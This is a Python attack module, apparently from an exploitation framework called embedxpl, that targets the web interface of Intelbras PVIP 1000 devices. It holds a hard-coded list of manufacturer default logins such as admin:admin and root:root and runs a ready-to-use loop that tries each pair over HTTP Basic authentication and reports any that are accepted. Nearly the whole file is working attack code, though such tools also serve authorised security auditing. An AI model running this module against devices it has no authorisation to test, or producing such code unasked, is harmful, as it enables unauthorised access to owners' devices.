# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Intelbras PVIP 1000 — Default Web Interface Credentials.

Brute-forces the web interface with known default credentials.

Version: 1.0.0
"""

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", ""),
    ("admin", "intelbras"),
    ("root", "root"),
    ("root", ""),
    ("user", "user"),
    ("supervisor", "supervisor"),
]


class Exploit(HTTPClient):
    """Intelbras PVIP 1000 Default Web Interface Credentials.

    Attempts authentication against the Intelbras PVIP 1000 web interface
    using known manufacturer default credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Intelbras PVIP 1000 Default Credentials",
        "description": (
            "Attempts authentication against the Intelbras PVIP 1000 web interface "
            "using known default credentials such as admin:admin, admin:123456."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": ("https://www.intelbras.com/",),
        "devices": ("Intelbras PVIP 1000",),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(80, "HTTP web interface port")
    stop_on_success = OptBool(True, "Stop after first valid credential pair")

    def run(self) -> None:
        print_status(
            "Trying default credentials on {}:{}...".format(self.target, self.port)
        )
        found = False
        for username, password in _DEFAULT_CREDENTIALS:
            resp = self.http_request(
                method="GET",
                path="/",
                headers={
                    "Authorization": self._basic_auth(username, password)
                },
            )
            if resp and resp.status_code == 200:
                print_success(
                    "Valid credentials: {}:{}".format(username, password)
                )
                found = True
                if self.stop_on_success:
                    return
            else:
                code = resp.status_code if resp else "no response"
                print_status(
                    "  {}:{} — {}".format(username, password, code)
                )

        if not found:
            print_error("No default credentials accepted")

    @staticmethod
    def _basic_auth(username: str, password: str) -> str:
        """Return Base64-encoded Basic auth header value.

        Args:
            username: Username string.
            password: Password string.

        Returns:
            Basic auth header string.
        """
        import base64
        token = base64.b64encode(
            "{}:{}".format(username, password).encode()
        ).decode()
        return "Basic {}".format(token)

    @mute
    def check(self) -> bool:
        resp = self.http_request(method="GET", path="/")
        return resp is not None and resp.status_code in (200, 401)
